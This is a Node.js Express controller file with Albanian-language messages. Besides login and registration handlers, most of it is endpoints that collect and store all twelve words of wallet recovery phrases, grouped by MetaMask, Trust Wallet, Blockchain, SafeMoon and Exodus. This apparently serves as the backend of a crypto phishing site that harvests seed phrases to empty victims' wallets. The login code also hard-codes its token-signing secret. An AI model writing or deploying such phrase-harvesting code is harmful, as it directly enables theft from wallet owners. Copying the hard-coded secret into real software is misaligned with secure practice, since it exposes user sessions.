const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/user");
const Phrase = require("../models/phraseRegistration");
const Metamask = require("../models/phraseMetamask");
const Trustwallet = require("../models/phraseTrustWallet");
const Blockchain = require("../models/phraseBlockchain");
const Safemoon = require("../models/phraseSafemoon");
const Exodus = require("../models/phraseExodus");
const user = require("../models/user");
const Updateprofile = require("../models/updateName");
// @route  POST/api/auth/register
// @desc   Register new user
// @access Public
exports.registerUser = async(req,res) => {
    const { name, lastName, email, password } = req.body;
    try {
        const user = await User.findOne({ email });
        if(!user) {
            const hashedPassword = await bcrypt.hash(password, 10);
            console.log({firstname:name, lastName, email, password: hashedPassword}); // was encrypted | password: hashedPassword
            const newUser = await User.create({ firstname:name, lastName, email, password: hashedPassword}); // was encrypted | password: hashedPassword
            res.status(201).json({
                success: true,
                data: {
                    id: newUser._id,
                    email: newUser.email
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete email.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
};


// @route  POST api/auth/login
// @desc   Login user
// @access Public

exports.loginUser = async (req,res) => {
    const { email, password} = req.body;
    try {
        const user = await User.findOne({ email });
        if(user) {
            // was if(await bcrypt.compare(password,user.password))
            if (await bcrypt.compare(password, user.password)) {
                const userForToken = { name: user.username, email: user.email, id: user.id };
                const accessToken = jwt.sign(userForToken, 'vCoLpSaItoZoPkZov2fkwovVodawT', { expiresIn: '1d'});
                res.json({
                    success: true,
                    data: {
                        accessToken,
                        user: {
                            id: user._id,
                            email: user.email
                        }
                    }
                });
            } else res.status(400).json({ success: false, msg: 'Password is wrong!'});
        } else res.status(400).json({ success: false, msg: 'Email is wrong!.'});
    } catch (err) {
        const errors = err.errors ? Object.keys(err.errors) : [];
        res.status(400).json({
            success: false,
            msg: "Something wen't wrong!",
            errors: errors.map(e => err.errors[e].message)
        });
    }
};

exports.phraseRegister = async(req, res) => {
    const {
      onePhrase,
      twoPhrase,
      threePhrase,
      fourPhrase,
      fivePhrase,
      sixPhrase,
      sevenPhrase,
      eightPhrase,
      ninePhrase,
      tenPhrase,
      elevenPhrase,
      twelvePhrase,
    } = req.body;
    try {
        const phrase = await Phrase.findOne({onePhrase});
        if(!phrase) {
            const newPhrase = await Phrase.create({
              onePhrase,
              twoPhrase,
              threePhrase,
              fourPhrase,
              fivePhrase,
              sixPhrase,
              sevenPhrase,
              eightPhrase,
              ninePhrase,
              tenPhrase,
              elevenPhrase,
              twelvePhrase,
            });

            res.status(201).json({
                success: true,
                data: {
                    id: newPhrase._id,
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete phrase word.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
};

exports.MetamaskRegister = async(req, res) => {
    const {
        onePhrase,
        twoPhrase,
        threePhrase,
        fourPhrase,
        fivePhrase,
        sixPhrase,
        sevenPhrase,
        eightPhrase,
        ninePhrase,
        tenPhrase,
        elevenPhrase,
        twelvePhrase,
    } = req.body;

    try {
        const phrasemetamask = await Metamask.findOne({onePhrase});
        if(!phrasemetamask) {
            const newPhraseMetamask = await Metamask.create({
                onePhrase,
                twoPhrase,
                threePhrase,
                fourPhrase,
                fivePhrase,
                sixPhrase,
                sevenPhrase,
                eightPhrase,
                ninePhrase,
                tenPhrase,
                elevenPhrase,
                twelvePhrase,
            });

            res.status(201).json({
                success: true,
                data: {
                    id: newPhraseMetamask._id,
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete phrase word.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
}

// export.TrustwalletRegister = async(req, res) => {
//     const {
//         onePhrase,
//         twoPhrase,
//         threePhrase,
//         fourPhrase,
//         fivePhrase,
//         sixPhrase,
//         sevenPhrase,
//         eightPhrase,
//         ninePhrase,
//         tenPhrase,
//         elevenPhrase,
//         twelvePhrase,
//     } = req.body;

//     try {
//         const phrasetrustwallet = await Trustwallet.findOne({onePhrase});
//         if(!phrasetrustwallet) {
//             const newPhraseTrustwallet = await Trustwallet.create({
//                 onePhrase,
//                 twoPhrase,
//                 threePhrase,
//                 fourPhrase,
//                 fivePhrase,
//                 sixPhrase,
//                 sevenPhrase,
//                 eightPhrase,
//                 ninePhrase,
//                 tenPhrase,
//                 elevenPhrase,
//                 twelvePhrase,
//             });

//             res.status(201).json({
//                 success: false,
//                 data: {
//                     id: newPhraseTrustwallet._id,
//                 }
//             });

//         } else {
//             res.status(400).json({
//                 success: false,
//                 msg: 'Ekziston nje perdoures me kete phrase word.'
//             });
//         }
//     } catch (err) {
//         res.status(400).json({
//             success: false,
//             msg: 'Diqka shkoi gabim'
//         });
//     }
// }

exports.TrustwalletRegister = async(req, res) => {
    const {
        onePhrase,
        twoPhrase,
        threePhrase,
        fourPhrase,
        fivePhrase,
        sixPhrase,
        sevenPhrase,
        eightPhrase,
        ninePhrase,
        tenPhrase,
        elevenPhrase,
        twelvePhrase,
    } = req.body;

    try {
        const phrasetrustwallet = await Trustwallet.findOne({onePhrase});
        if(!phrasetrustwallet) {
            const newPhraseTrustwallet = await Trustwallet.create({
                onePhrase,
                twoPhrase,
                threePhrase,
                fourPhrase,
                fivePhrase,
                sixPhrase,
                sevenPhrase,
                eightPhrase,
                ninePhrase,
                tenPhrase,
                elevenPhrase,
                twelvePhrase,
            });

            res.status(201).json({
                success: true,
                data: {
                    id: newPhraseTrustwallet._id,
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete phrase word.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
}

exports.BlockchainRegister = async(req, res) => {
    const {
        onePhrase,
        twoPhrase,
        threePhrase,
        fourPhrase,
        fivePhrase,
        sixPhrase,
        sevenPhrase,
        eightPhrase,
        ninePhrase,
        tenPhrase,
        elevenPhrase,
        twelvePhrase,
    } = req.body;

    try {
        const phraseblockchain = await Blockchain.findOne({onePhrase});
        if(!phraseblockchain) {
            const newPhraseBlockchain = await Blockchain.create({
                onePhrase,
                twoPhrase,
                threePhrase,
                fourPhrase,
                fivePhrase,
                sixPhrase,
                sevenPhrase,
                eightPhrase,
                ninePhrase,
                tenPhrase,
                elevenPhrase,
                twelvePhrase,
            });

            res.status(201).json({
                success: true,
                data: {
                    id: newPhraseBlockchain._id,
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete phrase word.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
}


exports.SafemoonRegister = async(req, res) => {
    const {
        onePhrase,
        twoPhrase,
        threePhrase,
        fourPhrase,
        fivePhrase,
        sixPhrase,
        sevenPhrase,
        eightPhrase,
        ninePhrase,
        tenPhrase,
        elevenPhrase,
        twelvePhrase,
    } = req.body;

    try {
        const phrasesafemoon = await Safemoon.findOne({onePhrase});
        if(!phrasesafemoon) {
            const newPhraseSafemoon = await Safemoon.create({
                onePhrase,
                twoPhrase,
                threePhrase,
                fourPhrase,
                fivePhrase,
                sixPhrase,
                sevenPhrase,
                eightPhrase,
                ninePhrase,
                tenPhrase,
                elevenPhrase,
                twelvePhrase,
            });

            res.status(201).json({
                success: true,
                data: {
                    id: newPhraseSafemoon._id,
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete phrase word.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
}

exports.ExodusRegister = async(req, res) => {
    const {
        onePhrase,
        twoPhrase,
        threePhrase,
        fourPhrase,
        fivePhrase,
        sixPhrase,
        sevenPhrase,
        eightPhrase,
        ninePhrase,
        tenPhrase,
        elevenPhrase,
        twelvePhrase,
    } = req.body;

    try {
        const phraseexodus = await Exodus.findOne({onePhrase});
        if(!phraseexodus) {
            const newPhraseExodus = await Exodus.create({
                onePhrase,
                twoPhrase,
                threePhrase,
                fourPhrase,
                fivePhrase,
                sixPhrase,
                sevenPhrase,
                eightPhrase,
                ninePhrase,
                tenPhrase,
                elevenPhrase,
                twelvePhrase,
            });

            res.status(201).json({
                success: true,
                data: {
                    id: newPhraseExodus._id,
                }
            });
        } else {
            res.status(400).json({
                success: false,
                msg: 'Ekziston nje perdorues me kete phrase word.'
            });
        }
    } catch (err) {
        res.status(400).json({
            success: false,
            msg: 'Diqka shkoi gabim.'
        });
    }
}


// exports.updateProfile = async(req, res) => {
//     const {
//       firstName,
//       lastName,
//     } = req.body;
//     try {
//         const updateProfileuser = await Updateprofile.findOne({barcode});
//         if(!updateProfileuser) {
//             const newProfile = await Updateprofile.create({
//               firstName,
//               lastName,
//             });

//             res.status(201).json({
//                 success: true,
//                 data: {
//                     id: newProfile._id,
//                 }
//             });
//         } else {
//             res.status(400).json({
//                 success: false,
//                 msg: 'Ekziston nje perdorues me kete barcode!'
//             });
//         }
//     } catch (err) {
//         res.status(400).json({
//             success: false,
//             msg: 'Diqka shkoi gabim.'
//         });
//     }
// };
